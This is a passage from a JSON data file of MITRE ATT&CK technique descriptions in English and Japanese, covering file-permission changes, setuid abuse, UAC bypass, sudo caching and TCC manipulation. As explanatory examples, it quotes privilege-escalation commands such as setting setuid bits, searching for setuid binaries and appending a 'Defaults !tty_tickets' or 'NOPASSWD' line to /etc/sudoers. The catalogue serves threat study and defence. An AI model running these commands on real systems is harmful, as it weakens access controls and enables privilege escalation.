                        "description_eng": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques)",
                        "description_jp": "攻撃者は、ファイルまたはディレクトリのアクセス許可/属性を変更して、アクセス制御リスト（ACL）を回避し、保護されたファイルにアクセスする可能性があります。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) ファイルおよびディレクトリのアクセス許可は、通常、ファイルまたはディレクトリの所有者、または適切なアクセス許可を持つユーザーによって構成されたACLによって管理されます。ファイルおよびディレクトリのACL実装はプラットフォームによって異なりますが、一般に、どのユーザーまたはグループがどのアクション（読み取り、書き込み、実行など）を実行できるかを明示的に指定します。\n\nほとんどのLinuxおよびLinuxベースのプラットフォームは、標準的なアクセス許可グループ（ユーザー、グループ、その他）と、各グループに適用される標準的なアクセス許可（読み取り、書き込み、実行）のセットを提供します。各プラットフォームのアクセス許可実装の詳細は異なる場合がありますが、ほとんどのプラットフォームはファイルおよびディレクトリACLを操作するために使用される2つの主要なコマンドを提供します：<code>chown</code>（change ownerの略）および<code>chmod</code>（change modeの略）。\n\n敵対者はこれらのコマンドを使用して、自分自身をファイルやディレクトリの所有者にしたり、現在の権限が許せばモードを変更したりするかもしれません。その後、他のユーザーをファイルから締め出すことができます。特定のファイルやディレクトリの変更は、[Unixシェル設定の変更](https://attack.mitre.org/techniques/T1546/004)による永続化の確立や、[実行フローの乗っ取り](https://attack.mitre.org/techniques/T1574)による他の重要なバイナリ/設定ファイルの汚染/乗っ取りなど、多くのテクニックに必要なステップとなる可能性があります。(引用：20 macOS Common Tools and Techniques)"
                    },
                    {
                        "id": "T1222.001",
                        "name_eng": "Windows File and Directory Permissions Modification",
                        "name_jp": "Windowsファイルおよびディレクトリのアクセス許可の変更",
                        "description_eng": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                        "description_jp": "攻撃者は、ファイルまたはディレクトリのアクセス許可/属性を変更して、アクセス制御リスト（ACL）を回避し、保護されたファイルにアクセスする可能性があります。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) ファイルおよびディレクトリのアクセス許可は、通常、ファイルまたはディレクトリの所有者、または適切なアクセス許可を持つユーザーによって構成されたACLによって管理されます。ファイルおよびディレクトリのACL実装はプラットフォームによって異なりますが、一般に、どのユーザーまたはグループがどのアクション（読み取り、書き込み、実行など）を実行できるかを明示的に指定します。\n\nWindowsは、ファイルおよびディレクトリACLを任意アクセス制御リスト（DACL）として実装します。(引用: Microsoft DACL May 2018) 標準ACLと同様に、DACLはセキュリティ保護可能なオブジェクトへのアクセスを許可または拒否されるアカウントを識別します。セキュリティ保護可能なオブジェクトへのアクセスが試行されると、システムはDACL内のアクセス制御エントリを順番にチェックします。一致するエントリが見つかった場合、オブジェクトへのアクセスが許可されます。それ以外の場合、アクセスは拒否されます。(引用: Microsoft Access Control Lists May 2018)\n\n攻撃者は、<code>icacls</code>、<code>cacls</code>、<code>takeown</code>、<code>attrib</code>などの組み込みWindowsコマンドを使用してDACLと対話できます。これにより、攻撃者は特定のファイルやフォルダに対するより高い権限を取得できます。さらに、[PowerShell](https://attack.mitre.org/techniques/T1059/001)は、ファイルやディレクトリのDACLを取得または変更するために使用できるコマンドレットを提供します。特定のファイルやディレクトリの変更は、[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)による永続化の確立、[ブートまたはログオン初期化スクリプト](https://attack.mitre.org/techniques/T1037)、または[実行フローのハイジャック](https://attack.mitre.org/techniques/T1574)による他の重要なバイナリ/構成ファイルの汚染/ハイジャックなど、多くのテクニックに必要なステップである可能性があります。"
                    }
                ]
            },
            {
                "id": "T1548",
                "name_eng": "Abuse Elevation Control Mechanism",
                "name_jp": "昇格制御メカニズムの悪用",
                "description_eng": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit)",
                "description_jp": "攻撃者は、より高いレベルの権限を得るために、権限昇格を制御するように設計されたメカニズムを回避する可能性があります。ほとんどの最新システムには、ユーザーがマシン上で実行できる権限を制限することを目的としたネイティブの昇格制御メカニズムが含まれています。より高いリスクと見なされる可能性のあるタスクを実行するためには、特定のユーザーに承認を与える必要があります。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 攻撃者は、システム上で権限を昇格させるために、組み込みの制御メカニズムを利用するいくつかの方法を実行できます。(引用: OSX Keydnap malware)(引用: Fortinet Fareit)",
                "subtechniques": [
                    {
                        "id": "T1548.001",
                        "name_eng": "Setuid and Setgid",
                        "name_jp": "SetuidおよびSetgid",
                        "description_eng": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)",
                        "description_jp": "攻撃者は、アプリケーションにsetuidまたはsetgidビットが設定されている構成を悪用して、異なる（そして場合によってはより特権的な）ユーザーのコンテキストでコードを実行させることができます。LinuxまたはmacOSでは、アプリケーションバイナリにsetuidまたはsetgidビットが設定されている場合、アプリケーションはそれぞれ所有ユーザーまたはグループの権限で実行されます。(引用: setuid man page) 通常、アプリケーションは、どのユーザーまたはグループがアプリケーションを所有しているかに関係なく、現在のユーザーのコンテキストで実行されます。ただし、プログラムが正しく機能するために昇格されたコンテキストで実行する必要があるが、それらを実行しているユーザーが必要な特定の権限を持っていない場合があります。\n\nrootによって実行する必要があるsudoersファイルにエントリを作成する代わりに、任意のユーザーが自分のアプリケーションにsetuidまたはsetgidフラグを設定するように指定できます（つまり、[LinuxおよびMacのファイルとディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222/002)）。<code>chmod</code>コマンドは、ビットマスキング（<code>chmod 4777 [file]</code>）または略記名（<code>chmod u+s [file]</code>）を使用してこれらのビットを設定できます。これにより、setuidビットが有効になります。setgidビットを有効にするには、<code>chmod 2775</code>および<code>chmod g+s</code>を使用できます。\n\n攻撃者は、将来昇格されたコンテキストで実行できるようにするために、このメカニズムを独自のマルウェアで使用できます。(引用: OSX Keydnap malware) この悪用は、しばしば「シェルエスケープ」または制限された権限を持つ実行環境をバイパスするためのその他のアクションの一部です。\n\nあるいは、攻撃者は、setuidまたはsetgidビットが既に有効になっている脆弱なバイナリを見つけてターゲットにすることを選択する場合があります（つまり、[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)）。setuidおよびsetgidビットは、<code>ls -l</code>を介してファイルの属性を表示するときに「x」の代わりに「s」で示されます。<code>find</code>コマンドを使用してそのようなファイルを検索することもできます。例えば、<code>find / -perm +4000 2>/dev/null</code>を使用してsetuidが設定されたファイルを見つけることができ、<code>find / -perm +2000 2>/dev/null</code>をsetgidに使用できます。これらのビットが設定されているバイナリは、攻撃者によって悪用される可能性があります。(引用: GTFOBins Suid)"
                    },
                    {
                        "id": "T1548.005",
                        "name_eng": "Temporary Elevated Cloud Access",
                        "name_jp": "一時的なクラウドアクセス権限昇格",
                        "description_eng": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",
                        "description_jp": "攻撃者は、一時的に昇格されたクラウドリソースへのアクセスを可能にする権限設定を悪用する可能性があります。多くのクラウド環境では、管理者はユーザーアカウントまたはサービスアカウントに対し、ロールへのジャストインタイムアクセスを要求したり、他のアカウントになりすましたり、リソースやサービスにロールを渡したり、あるいは自身の権限とは異なる可能性のある一連の権限への短期的なアクセスを許可することができます。\n\nジャストインタイムアクセスは、クラウドアカウントに追加のロールをきめ細かく一時的に付与するためのメカニズムです。これにより、アカウントは日常的に必要な権限のみで運用し、必要に応じて追加の権限を要求できます。ジャストインタイムアクセス要求は、手動承認が必要なように設定されることもあれば、目的の権限が自動的に付与されることもあります。(引用: Azure Just in Time Access 2023)\n\nアカウントの偽装により、ユーザーアカウントまたはサービスアカウントは、一時的に別のアカウントの権限で行動できます。例えば、GCPでは`iam.serviceAccountTokenCreator`ロールを持つユーザーは、サービスアカウントの権限で一時的なアクセストークンを作成したり、任意のペイロードに署名したりできます。一方、ドメイン全体の委任権限を持つサービスアカウントは、Google Workspaceアカウントになりすますことが許可されています。(引用: Google Cloud Service Account Authentication Roles)(引用: Hunters Domain Wide Delegation Google Workspace 2023)(引用: Google Cloud Just in Time Access 2023)(引用: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) Exchange Onlineでは、`ApplicationImpersonation`ロールにより、サービスアカウントは指定されたユーザーアカウントに関連付けられた権限を使用できます。(引用: Microsoft Impersonation and EWS in Exchange)\n\n多くのクラウド環境には、ユーザーがリソースにロールを渡してタスクを実行したり、他のサービスに認証したりすることを可能にするメカニズムも含まれています。リソースを作成するユーザーは、それに渡すロールを直接引き継ぐわけではありませんが、付与された権限で特定のアクションを実行するようにリソースを設定するなどして、ロールのアクセスを利用できる場合があります。AWSでは、`PassRole`権限を持つユーザーは、作成したサービスに特定のロールを引き継がせることができます。一方、GCPでは、`iam.serviceAccountUser`ロールを持つユーザーは、サービスアカウントをリソースにアタッチできます。(引用: AWS PassRole)(引用: Google Cloud Service Account Authentication Roles)\n\nユーザーがこれらの機能のいずれかを使用するには特定のロール割り当てが必要ですが、クラウド管理者は権限を誤って設定する可能性があります。これにより、攻撃者が元々意図されていた範囲を超えてリソースにアクセスできるようになる昇格パスが生じる可能性があります。(引用: Rhino Google Cloud Privilege Escalation)(引用: Rhino Security Labs AWS Privilege Escalation)\n\n**注:** このテクニックは、アカウントに永続的なロールを割り当てるのではなく、既存の権限構造を悪用してリソースへの一時的に昇格されたアクセスを得ることを伴う[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)とは異なります。ただし、十分に特権のあるアカウントを侵害した攻撃者は、制御下にある別のアカウントに、これらの機能も悪用できる[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を付与する可能性があります。これは、特にログでロールの偽装が行われているタイミングが明確でない場合、特権の高いアカウントを直接使用するよりもステルス性が高まる可能性があります。(引用: CrowdStrike StellarParticle January 2022)"
                    },
                    {
                        "id": "T1548.002",
                        "name_eng": "Bypass User Account Control",
                        "name_jp": "ユーザーアカウント制御のバイパス",
                        "description_eng": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                        "description_jp": "攻撃者はUACメカニズムをバイパスして、システム上のプロセス権限を昇格させる可能性があります。Windowsユーザーアカウント制御（UAC）は、プログラムがその権限（低から高までの整合性レベルとして追跡される）を昇格させて、管理者レベルの権限でタスクを実行できるようにするもので、場合によってはユーザーに確認を求めることがあります。ユーザーへの影響は、高強制下での操作の拒否から、ローカル管理者グループに属していてプロンプトをクリックした場合の操作の許可、または管理者パスワードを入力して操作を完了させることまで及びます。(引用: TechNet How UAC Works)\n\nコンピュータのUAC保護レベルが最高レベル以外に設定されている場合、特定のWindowsプログラムは、UAC通知ボックスを介してユーザーにプロンプトを表示することなく、権限を昇格させたり、一部の昇格された[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)オブジェクトを実行したりできます。(引用: TechNet Inside UAC)(引用: MSDN COM Elevation) この例としては、[Rundll32](https://attack.mitre.org/techniques/T1218/011)を使用して、自動昇格された[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)オブジェクトをロードし、通常は昇格されたアクセスが必要となる保護されたディレクトリでファイル操作を実行する、特別に細工されたDLLをロードすることが挙げられます。悪意のあるソフトウェアが信頼されたプロセスに注入され、ユーザーにプロンプトを表示することなく昇格された権限を取得することもあります。(引用: Davidson Windows)\n\nUACをバイパスする多くの方法が発見されています。UACMEのGithub readmeページには、発見され実装されたメソッドの広範なリストが含まれていますが(引用: Github UACMe)、バイパスの包括的なリストではない可能性があります。追加のバイパス方法は定期的に発見されており、次のようなものが実際に使用されています。\n\n* <code>eventvwr.exe</code>は自動昇格し、指定されたバイナリまたはスクリプトを実行できます。(引用: enigma0x3 Fileless UAC Bypass)(引用: Fortinet Fareit)\n\n管理者権限を持つアカウントの資格情報がわかっている場合、UACは単一システムのセキュリティメカニズムであり、あるシステムで実行されているプロセスの権限や整合性はリモートシステムでは不明であり、デフォルトで高整合性となるため、一部の横方向の移動テクニックを介して別のバイパスが可能です。(引用: SANS UAC Bypass)"
                    },
                    {
                        "id": "T1548.004",
                        "name_eng": "Elevated Execution with Prompt",
                        "name_jp": "プロンプトによる昇格実行",
                        "description_eng": "Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \n\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
                        "description_jp": "攻撃者は<code>AuthorizationExecuteWithPrivileges</code> APIを利用して、ユーザーに資格情報を要求することで権限を昇格させる可能性があります。(引用: AppleDocs AuthorizationExecuteWithPrivileges) このAPIの目的は、アプリケーション開発者がアプリケーションのインストールや更新など、ルート権限で操作を簡単に行えるようにすることです。このAPIは、ルート権限を要求するプログラムが信頼できるソースからのものであるか、または悪意を持って変更されていないかを検証しません。\n\nこのAPIは非推奨ですが、macOSの最新リリースでも完全に機能します。このAPIを呼び出すと、ユーザーは資格情報の入力を求められますが、プログラムの出所や整合性に関するチェックは行われません。APIを呼び出すプログラムは、昇格された権限で悪意のある動作を実行するように変更できる、グローバルに書き込み可能なファイルをロードすることもあります。\n\n攻撃者は<code>AuthorizationExecuteWithPrivileges</code>を悪用してルート権限を取得し、被害者に悪意のあるソフトウェアをインストールしたり、永続化メカニズムをインストールしたりする可能性があります。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019)(引用: OSX Coldroot RAT) このテクニックは、ユーザーを騙して悪意のあるコードに昇格された権限を付与させるために[マスカレード](https://attack.mitre.org/techniques/T1036)と組み合わせることができます。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019) このテクニックは、このAPIを利用するマシン上に存在する正当なプログラムを変更することでも機能することが示されています。(引用: Death by 1000 installers; it's all broken!)"
                    },
                    {
                        "id": "T1548.003",
                        "name_eng": "Sudo and Sudo Caching",
                        "name_jp": "SudoおよびSudoキャッシング",
                        "description_eng": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                        "description_jp": "攻撃者はsudoキャッシングを実行したり、sudoersファイルを使用して権限を昇格させたりする可能性があります。攻撃者はこれを利用して、他のユーザーとしてコマンドを実行したり、より高い権限でプロセスを起動したりする可能性があります。\n\nLinuxおよびMacOSシステム内では、sudo（「スーパーユーザー実行」とも呼ばれる）により、ユーザーは昇格された権限でターミナルからコマンドを実行し、システム上でこれらのコマンドを実行できるユーザーを制御できます。<code>sudo</code>コマンドは、「システム管理者が、特定のユーザー（またはユーザーグループ）に、コマンドとその引数の監査証跡を提供しながら、ルートまたは別のユーザーとして一部（またはすべて）のコマンドを実行する権限を与えることを許可します。」(引用: sudo man page 2018) sudoはシステム管理者向けに作成されたため、<code>timestamp_timeout</code>などの便利な構成機能があります。これは、パスワードの再入力を求める前に<code>sudo</code>のインスタンス間で経過する時間（分単位）です。これは、<code>sudo</code>が一定期間資格情報をキャッシュする機能を持っているためです。Sudoは、このタイムアウトを決定するために、最後にsudoが実行されたときのタイムスタンプを持つファイルを<code>/var/db/sudo</code>に作成（またはタッチ）します。さらに、各新しいtty（ターミナルセッション）を個別に扱う<code>tty_tickets</code>変数があります。これは、たとえば、あるttyのsudoタイムアウトが別のttyに影響しないことを意味します（再度パスワードを入力する必要があります）。\n\n<code>/etc/sudoers</code>ファイルは、どのユーザーがどのコマンドをどのターミナルから実行できるかを記述します。また、ユーザーが他のユーザーまたはグループとして実行できるコマンドも記述します。これにより、ユーザーはほとんどの場合、可能な限り低い権限で実行し、必要に応じて他のユーザーまたは権限に昇格する（通常はパスワードの入力を求める）という最小権限の原則が提供されます。ただし、sudoersファイルは、<code>user1 ALL=(ALL) NOPASSWD: ALL</code>のような行でユーザーにパスワードの入力を求めないように指定することもできます。(引用: OSX.Dok Malware) ただし、このファイルを編集するには昇格された権限が必要です。\n\n攻撃者はまた、これらのメカニズムの不適切な構成を悪用して、ユーザーのパスワードを必要とせずに権限を昇格させる可能性があります。例えば、<code>/var/db/sudo</code>のタイムスタンプを監視して、<code>timestamp_timeout</code>の範囲内にあるかどうかを確認できます。もしそうであれば、マルウェアはユーザーのパスワードを入力する必要なくsudoコマンドを実行できます。さらに、<code>tty_tickets</code>が無効になっている場合、攻撃者はそのユーザーの任意のttyからこれを実行できます。\n\n実際に、マルウェアはスクリプト作成を容易にするために、<code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>を発行して<code>tty_tickets</code>を無効にしています。(引用: cybereason osx proton) この変更を反映させるために、マルウェアは<code>killall Terminal</code>も発行しました。macOS Sierra以降、sudoersファイルではデフォルトで<code>tty_tickets</code>が有効になっています。"
                    },
                    {
                        "id": "T1548.006",
                        "name_eng": "TCC Manipulation",
                        "name_jp": "TCC操作",
                        "description_eng": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).\n\nWhen an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)\n\nAdversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055) or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)",
                        "description_jp": "攻撃者は、透過性、同意、制御（TCC）サービスまたはデータベースを操作または悪用して、悪意のある実行可能ファイルに昇格された権限を付与する可能性があります。TCCは、実行中のプロセスが画面共有、カメラ、マイク、またはフルディスクアクセス（FDA）など、TCCによって保護されているデータまたはサービスにアクセスする権限を持っているかどうかを判断するために使用されるPrivacy & Security macOS制御メカニズムです。\n\nアプリケーションがTCCによって保護されているデータまたはサービスへのアクセスを要求すると、TCCデーモン（`tccd`）は、`/Library/Application Support/com.apple.TCC/TCC.db`（および`~/`同等物）にあるTCCデータベースと、既存の権限についての上書きファイル（MDMに接続されている場合）を確認します。権限が存在しない場合は、ユーザーに権限の付与を求めるプロンプトが表示されます。権限が付与されると、データベースはアプリケーションの権限を保存し、リセットされない限りユーザーに再度プロンプトを表示しません。例えば、WebブラウザがユーザーのWebカメラへの権限を要求した場合、一度付与されるとWebブラウザはユーザーに明示的に再度プロンプトを表示しない場合があります。(引用: welivesecurity 